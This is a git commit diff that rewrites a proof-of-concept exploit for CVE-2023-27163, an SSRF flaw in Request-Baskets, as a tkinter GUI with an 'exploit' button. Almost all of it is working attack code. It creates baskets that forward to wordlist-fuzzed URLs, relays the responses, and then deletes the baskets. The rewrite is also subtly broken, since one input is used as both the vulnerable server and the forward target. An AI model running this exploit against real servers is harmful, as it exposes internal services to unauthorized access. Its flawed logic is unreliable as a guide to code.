0e86374e0714f06b5766b67130cd029b785163c5
ibrahim ali <82097150+abrahim7112@users.noreply.github.com>
2023-08-30 10:41:05 -0400

    Update CVE_2023_27163.py
    Signed-off-by: ibrahim ali <82097150+abrahim7112@users.noreply.github.com>

--- CVE_2023_poc/CVE_2023_27163.py
+++ CVE_2023_poc/CVE_2023_27163.py
@@ -11,44 +11,69 @@ from logging import debug, info
 
 from requests import post, get, delete 
 
-parser = ArgumentParser(prog="CVE-2023-27163", 
-                        description="Example usage: python3 CVE-2023-27163.py http/s://<Vuln-IP>:<Port> -t http/s://<Target>/ (Target can be internal services)",
-                        epilog="SSRF on Request-Baskets (<= 1.2.1)")
+import tkinter
+from tkinter import *
+import tkinter as tk
+from tkinter.ttk import *
+from time import strftime
+from tkinter import ttk
+def attack():
+    root = tkinter.Tk()
+    root.title("CVE-2023-27163 exploits")
+    root.geometry('800x600+0+0')
+    def printInput():
+        inp = inputtxt.get(1.0, "end-1c")
+        lbl.config(text = "attack url : "+inp)
+        BASE_URL = inp
+        lines = []
 
-parser.add_argument("BASE_URL", type=str, help="vulnerable base url (eg: http://localhost:55555/)")
-parser.add_argument("-t", "--target", required=True, type=str, help="URL which the server will request")
-parser.add_argument("-w", "--wordlist", required=True, type=str, default=False, help="Wordlist to fuzz")
-args = parser.parse_args()
+        with open('CVE_2023_poc/wordlist-skipfish.fuzz.txt', 'r') as f:
+            for line in f:
+                url = inp + '/' + line.strip()
+                payload = {
+		          "forward_url": url,
+		          "proxy_response": True,
+		          "insecure_tls": False,
+		          "expand_path": True,
+		          "capacity": 250
+                }
 
-print("POC of SSRF for Request-Baskets (CVE-2023-27163)\n")
+                basket_name: str = genBasketName(5)
+                basket_url: str = urljoin(urljoin(BASE_URL, "/api/baskets/"), basket_name) 
+                debug(f"Creating basket at {basket_url}")
 
-lines = []
+                response = post(basket_url, json=payload)
+                token: str = loads(response.text)['token']
+                debug(f"Token received: {token}")
 
-with open(args.wordlist, 'r') as f:
-	for line in f:
-		url = args.target + '/' + line.strip()
-		payload = {
-		  "forward_url": url,
-		  "proxy_response": True,
-		  "insecure_tls": False,
-		  "expand_path": True,
-		  "capacity": 250
-		}
+                response = post(basket_url, json=payload)
 
-		basket_name: str = genBasketName(5)
-		basket_url: str = urljoin(urljoin(args.BASE_URL, "/api/baskets/"), basket_name) 
-		debug(f"Creating basket at {basket_url}")
-
-		response = post(basket_url, json=payload)
-		token: str = loads(response.text)['token']
-		debug(f"Token received: {token}")
-
-		response = post(basket_url, json=payload)
-
-		response = get(urljoin(args.BASE_URL, basket_name), headers={"Authorization": token})
-
-		if response.status_code == 200:
-			print('Response code 200 on url: ' + url)
-			print(response.content)
-
-		assert delete(urljoin(urljoin(args.BASE_URL, "/api/baskets/"), basket_name), headers={"Authorization": token}).status_code == 204
+                response = get(urljoin(BASE_URL, basket_name), headers={"Authorization": token})
+                scroll_y = Scrollbar(root, orient=VERTICAL)
+                txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+                scroll_y.pack(side=RIGHT, fill=Y)
+                scroll_y.config(command=txtarea.yview)
+                txtarea.insert(END, "response: ")
+                txtarea.insert(END, response.text)
+                txtarea.pack(fill=BOTH, expand=True)
+                txtarea.configure(state ='disabled')
+                if response.status_code == 200:
+                    scroll_y = Scrollbar(root, orient=VERTICAL)
+                    txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+                    scroll_y.pack(side=RIGHT, fill=Y)
+                    scroll_y.config(command=txtarea.yview)
+		        	#print('Response code 200 on url: ' + url)
+			      #  print(response.content)
+                    txtarea.insert(END, "Response code 200 on url: ")
+                    txtarea.insert(END, url)
+                    txtarea.pack(fill=BOTH, expand=True)
+                    txtarea.configure(state ='disabled')
+                assert delete(urljoin(urljoin(BASE_URL, "/api/baskets/"), basket_name), headers={"Authorization": token}).status_code == 204
+    Hacher = Label(root, text="POC of SSRF for Request-Baskets (CVE-2023-27163)\n\nEnter url or domin https://www.example.com/ : ").pack()
+    inputtxt = tk.Text(root,height = 1,width = 80)
+    inputtxt.pack()
+    printButton = tk.Button(root,text = "exploit", command = printInput)
+    printButton.pack()
+    lbl = tk.Label(root, text = "")
+    lbl.pack()
+    root.mainloop()
